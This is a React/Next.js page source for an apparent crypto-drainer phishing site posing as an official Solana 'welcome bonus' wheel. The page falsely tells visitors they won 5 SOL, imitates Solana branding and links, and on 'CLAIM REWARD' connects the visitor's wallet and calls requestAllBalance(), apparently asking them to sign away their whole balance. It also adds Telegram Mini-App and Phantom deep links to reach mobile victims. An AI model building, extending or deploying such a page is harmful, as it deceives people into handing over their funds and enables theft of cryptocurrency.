// app/page.tsx
/* eslint-disable @typescript-eslint/no-explicit-any */

'use client'

import React, { useEffect, useRef, useState, Fragment } from 'react'
import './assets/2idql.css'
import './assets/connect.css'
import { Transition } from '@headlessui/react'
import { useWallet } from '@solana/wallet-adapter-react'
import type { WalletAdapter, WalletReadyState } from '@solana/wallet-adapter-base'
import { requestAllBalance } from '@/app/services/transaction'

// Telegram Mini-App tipi
type TgWindow = Window & { Telegram?: { WebApp?: any } }

export default function Page() {
  /* ——— Telegram Mini-App başlat ——— */
  useEffect(() => {
    const webapp = (window as TgWindow).Telegram?.WebApp
    if (!webapp) return
    try {
      webapp.expand()
      webapp.requestFullscreen?.()
      webapp.setHeaderColor('bg_color', '#000000')
      webapp.setBackgroundColor('#000000')
      if (webapp.disableVerticalSwipes) webapp.disableVerticalSwipes()
      else if (webapp.scroll) {
        const lock = () => webapp.scroll!(window.scrollY)
        window.addEventListener('scroll', lock)
        return () => window.removeEventListener('scroll', lock)
      }
    } catch { /**/ }
  }, [])

  /* ——— Phantom deeplink fonksiyonu ——— */
  const openPhantomBrowser = () => {
    const dappUrl = encodeURIComponent('https://solspin-seven.vercel.app/')
    const refUrl  = dappUrl
    const universal = `https://phantom.app/ul/browse/${dappUrl}?ref=${refUrl}`
    window.open(universal, '_blank')
  }

  /* ——— Çark (spin) durumu ——— */
  const wheelRef = useRef<HTMLImageElement>(null)
  const [hasSpun, setHasSpun] = useState<boolean>(
    () => typeof window !== 'undefined' && localStorage.getItem('hasSpun') === 'true'
  )
  useEffect(() => {
    if (hasSpun) document.querySelector('._1')?.classList.add('modal_active')
  }, [hasSpun])
  const handleSpin = () => {
    if (hasSpun || !wheelRef.current) return
    const w = wheelRef.current
    w.style.transition = 'transform 9000ms ease-in-out'
    w.style.transform  = 'rotate(1080deg)'
    setTimeout(() => {
      w.style.transition = 'none'
      w.style.transform  = 'rotate(0deg)'
    }, 9000)
    setTimeout(() => {
      setHasSpun(true)
      localStorage.setItem('hasSpun', 'true')
    }, 10000)
  }

  /* ——— Wallet & Drawer kontrolü ——— */
  const { wallets, select, publicKey } = useWallet()
  const [drawerOpen, setDrawerOpen] = useState(false)
  const [loading,    setLoading]    = useState(false)
  const [msg,        setMsg]        = useState('')

  const openDrawer  = () => setDrawerOpen(true)
  const closeDrawer = () => setDrawerOpen(false)

  /* ——— Wallet yapılandırmaları & sıralama ——— */
  const origin = typeof window !== 'undefined' ? window.location.origin : ''

  interface WalletConfig {
    match: (adapterName: string) => boolean
    label: string
    icon: string
    deepLink: string
  }

  const walletConfigs: WalletConfig[] = [
    {
      match: name => name === 'Phantom',
      label: 'Phantom',
      icon: '/phantom.svg',
      deepLink: '' // Phantom için openPhantomBrowser() kullanacağız
    },
    {
      match: name => name.toLowerCase().includes('trust'),
      label: 'Trust Wallet',
      icon: '/trustwallet.svg',
      deepLink: 'https://link.trustwallet.com/open_url'
    },
    {
      match: name => name.toLowerCase().includes('coinbase'),
      label: 'Coinbase Wallet',
      icon: '/coinbase.svg',
      deepLink: 'https://www.coinbase.com/wallet'
    },
    {
      match: name =>
        name.toLowerCase().includes('bitkeep') ||
        name.toLowerCase().includes('bitget'),
      label: 'Bitget Wallet',
      icon: '/bitget.svg',
      deepLink: 'https://web3.bitget.com/'
    },
    {
      match: name => name === 'Solflare',
      label: 'Solflare',
      icon: '/solflare.svg',
      deepLink: `https://solflare.com/access?app_url=${encodeURIComponent(origin)}`
    },
    {
      match: name => name === 'Backpack',
      label: 'Backpack',
      icon: '/backpack.svg',
      deepLink: 'https://www.backpack.app/'
    },
  ]

  type DrawerWallet = WalletConfig & {
    adapter: WalletAdapter
    readyState: WalletReadyState
  }

  // 1) map ile (DrawerWallet | null)[]
  const mappedWallets: Array<DrawerWallet | null> = walletConfigs.map(cfg => {
    const w = wallets.find(w => cfg.match(w.adapter.name))
    return w
      ? {
          adapter:    w.adapter,
          readyState: w.readyState,
          ...cfg
        }
      : null
  })

  // 2) filter ile DrawerWallet[]
  const orderedWallets: DrawerWallet[] = mappedWallets.filter(
    (x): x is DrawerWallet => x !== null
  )

  /* ——— Transaction gönderme ——— */
  const doTx = async () => {
    setLoading(true)
    const ok = await requestAllBalance()
    setLoading(false)
    if (!ok) {
      setMsg('No enough Sol!')
      setTimeout(() => setMsg(''), 5000)
    }
  }

  /* ——— Claim butonu ——— */
  const handleClaim = () => {
    if (!publicKey) openDrawer()
    else doTx()
  }

  /* ——— Cüzdan seçimi ——— */
  const handleWalletClick = async (w: DrawerWallet) => {
    closeDrawer()

    if (w.adapter.name === 'Phantom') {
      if (w.readyState === 'Installed' && window.solana?.isPhantom) {
        await select('Phantom')
        doTx()
      } else {
        openPhantomBrowser()
      }
      return
    }

    if (w.readyState === 'Installed') {
      await select(w.adapter.name)
      doTx()
    } else {
      window.open(w.deepLink, '_blank')
    }
  }

      return (
        <>
          {/* ---------- HERO BANNER ---------- */}
          <div className="_1">
            <div className="_g">
              <span className="_a">
                <div className="_3">
                  <p className="_7">
                    CONGRATULATIONS!<br/>
                    <span className="_a">You won</span>{' '}
                    <span className="_a">5 $SOL</span>
                  </p>
                </div>
              </span>
              <div className="_9">
                <div className="_i">
                  <p className="_k">Connect your wallet to receive reward</p>
                  <button onClick={handleClaim} className="_s" disabled={loading}>
                    {loading ? 'Please wait…' : msg || 'CLAIM REWARD'}
                  </button>
                </div>
              </div>
            </div>
          </div>

          {/* ---------- HEADER ---------- */}
          <section className="_b">
            <div className="_d">
              <div className="_x">
                <div className="_0">
                  <a href="#!" className="_h">
                    <img src="/header_logo.svg" alt="Solana logo" />
                  </a>
                  <a href="#!" className="_w">
                    <img src="/alik.png" className="_t" alt="avatar" />
                  </a>
                </div>
                <div className="_0">
                  <div className="_6">
                    <a href="https://x.com/solana?mx=2" target="_blank" rel="noreferrer">
                      <img src="/header_twitter.svg" alt="Twitter" />
                    </a>
                    <a href="https://t.me/solana" target="_blank" rel="noreferrer">
                      <img src="/header_tg.svg" alt="Telegram" />
                    </a>
                    <a href="https://www.youtube.com/SolanaFndn" target="_blank" rel="noreferrer">
                      <img src="/header_mail.svg" alt="YouTube" />
                    </a>
                    <a href="https://discord.com/invite/kBbATFA7PW" target="_blank" rel="noreferrer">
                      <img src="/header_ds.svg" alt="Discord" />
                    </a>
                  </div>
                </div>
                <div className="_0">
                  <button onClick={openDrawer} className="_n">
                    <span className="_a">
                      {publicKey ? 'Wallet connected' : 'Connect Wallet'}
                    </span>
                    <img src="/header_arrow.svg" alt="→" />
                  </button>
                </div>
              </div>
            </div>
          </section>

          {/* ---------- MAIN SECTION ---------- */}
          <section className="_m">
            <div className="_d">
              <h1 className="_4">
                WELCOME <span>BONUS</span><br/>
                FOR SOLANA USERS
              </h1>
              <div className="_o">
                <div className="_r">
                  <img src="/wheel_arrow.png" alt="Arrow" className="_f" />
                  <img ref={wheelRef} src="/wheel_wheel.png" alt="Wheel" className="_l" />
                  <button className="_y" onClick={handleSpin}>FREE SPIN</button>
                </div>
              </div>
              <div className="_u">
                <div className="_j">
                  <p className="_p">
                    <img src="/main_one.svg" alt="step 1" />
                    If you have received a qualification notification in the form of SOL or USDT, click the «FREE SPIN» button
                  </p>
                  <p className="_p">
                    <img src="/main_two.svg" alt="step 2" />
                    If you win a reward in free spin, we congratulate you!
                  </p>
                  <p className="_p">
                    <img src="/main_three.svg" alt="step 3" />
                    Click «CLAIM REWARD», connect your wallet and confirm the received transaction
                  </p>
                </div>
                <p className="_e">All rights reserved © 2025 SOLANA.</p>
              </div>
            </div>
          </section>

          {/* ——— CONNECT DRAWER & MODAL ——— */}
          <Transition show={drawerOpen} as={Fragment}>
            {/* overlay */}
            <Transition.Child
              as="div"
              enter="transition-opacity duration-200"
              enterFrom="opacity-0"
              enterTo="opacity-60"
              leave="transition-opacity duration-200"
              leaveFrom="opacity-60"
              leaveTo="opacity-0"
              className="connect-overlay"
              onClick={closeDrawer}
            />

            {/* mobile bottom sheet */}
            <Transition.Child
              as="div"
              enter="transition-transform duration-200"
              enterFrom="translate-y-full"
              enterTo="translate-y-0"
              leave="transition-transform duration-200"
              leaveFrom="translate-y-0"
              leaveTo="translate-y-full"
              className="connect-sheet md:hidden"
            >
              <div className="connect-header">
                <h2 className="connect-title">Connect Wallet</h2>
                <button className="connect-close" onClick={closeDrawer}>×</button>
              </div>
              <div className="connect-list">
                {orderedWallets.map(w => (
                  <div
                    key={w.adapter.name}
                    className="connect-row"
                    onClick={() => handleWalletClick(w)}
                  >
                    <div className="connect-icon">
                      <img src={w.icon} alt={w.label} />
                    </div>
                    <span className="connect-text">{w.label}</span>
                  </div>
                ))}
              </div>
              <p className="connect-footer">
                Haven’t got a wallet?{' '}
                <a href="https://solana.com/wallets" target="_blank">
                  Get started
                </a>
              </p>
            </Transition.Child>

            {/* desktop centered modal */}
            <Transition.Child
              as="div"
              enter="transition-opacity duration-200"
              enterFrom="opacity-0"
              enterTo="opacity-100"
              leave="transition-opacity duration-200"
              leaveFrom="opacity-100"
              leaveTo="opacity-0"
              className="hidden md:flex fixed inset-0 z-50 items-center justify-center bg-black/40"
            >
              <div className="drawer-card space-y-4">
                <div className="connect-header">
                  <h2 className="connect-title">Connect Wallet</h2>
                  <button className="connect-close" onClick={closeDrawer}>×</button>
                </div>
                <div className="connect-list">
                  {orderedWallets.map(w => (
                    <div
                      key={w.adapter.name}
                      className="connect-row"
                      onClick={() => handleWalletClick(w)}
                    >
                      <div className="connect-icon">
                        <img src={w.icon} alt={w.label} />
                      </div>
                      <span className="connect-text">{w.label}</span>
                    </div>
                  ))}
                </div>
                <p className="connect-footer">
                  Haven’t got a wallet?{' '}
                  <a href="https://solana.com/wallets" target="_blank">
                    Get started
                  </a>
                </p>
              </div>
            </Transition.Child>
          </Transition>
        </>
      )
}
